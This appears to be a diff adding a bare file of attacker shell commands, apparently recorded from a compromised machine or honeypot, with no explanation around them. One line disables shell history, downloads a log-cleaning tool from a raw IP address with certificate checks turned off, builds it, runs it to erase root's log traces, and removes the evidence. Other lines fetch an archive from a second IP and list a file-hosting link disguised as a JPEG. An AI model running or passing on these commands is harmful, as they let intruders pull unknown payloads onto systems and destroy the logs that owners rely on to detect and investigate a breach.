@@ -1,0 +1,5 @@
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG ; export HISTFILE=/dev/null ; export HISTSIZE=0; export HISTFILESIZE=0 ;wget 2.57.122.121/mig-logcleaner11.tar.gz --no-check-certificate ;tar xzvf mig-logcleaner11.tar.gz;cd mig-logcleaner;make linux ;./mig-logcleaner -u root;cd ..;rm -rf mig-logcleaner11.tar.gz;rm -rf mig-logcleaner
+
+wget 51.195.42.59:800/ex.tgz
+
+http://bashupload.com/CRBEh/java.jpg [File Not Found]
